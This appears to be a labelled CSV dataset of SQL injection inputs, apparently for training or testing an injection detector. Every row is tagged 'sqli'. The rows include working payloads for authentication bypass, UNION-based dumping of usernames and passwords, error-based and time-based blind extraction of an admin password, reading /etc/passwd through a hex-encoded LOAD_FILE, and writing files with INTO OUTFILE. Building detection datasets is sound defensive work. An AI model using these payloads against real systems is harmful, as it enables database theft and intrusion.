text,label
',sqli
'',sqli
`,sqli
``,sqli
",",sqli
"""",sqli
"""""",sqli
/,sqli
//,sqli
\,sqli
\\,sqli
;,sqli
' OR '1'='1,sqli
' OR 1=1--,sqli
' OR 1=1#,sqli
' OR 1=1/*,sqli
') OR ('1'='1,sqli
' UNION SELECT NULL--,sqli
"' UNION SELECT NULL,NULL--",sqli
"' UNION SELECT NULL,NULL,NULL--",sqli
"' UNION SELECT username,password FROM users--",sqli
' UNION SELECT table_name FROM information_schema.tables--,sqli
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,sqli
"' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))--",sqli
"' AND UPDATEXML(1, CONCAT(0x5c, (SELECT @@version)), 1)--",sqli
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,sqli
"' AND (SELECT * FROM (SELECT(BENCHMARK(1000000,MD5(1))))a)--",sqli
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--,sqli
"' AND (SELECT ASCII(SUBSTRING((SELECT @@version),1,1))) > 0--",sqli
"' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))) > 0--",sqli
' AND (SELECT LOAD_FILE(0x2f6574632f706173737764))--,sqli
' INTO OUTFILE '/tmp/test.txt',sqli
' INTO DUMPFILE '/tmp/test.txt',sqli
' AND (SELECT * FROM users WHERE username='admin' AND LENGTH(password)>0)--,sqli
"' AND (SELECT * FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>0)--",sqli
"' AND (SELECT * FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)--",sqli
' AND (SELECT * FROM users WHERE username='admin' AND SLEEP(5))--,sqli
"' AND (SELECT * FROM users WHERE username='admin' AND BENCHMARK(1000000,MD5(1)))--",sqli
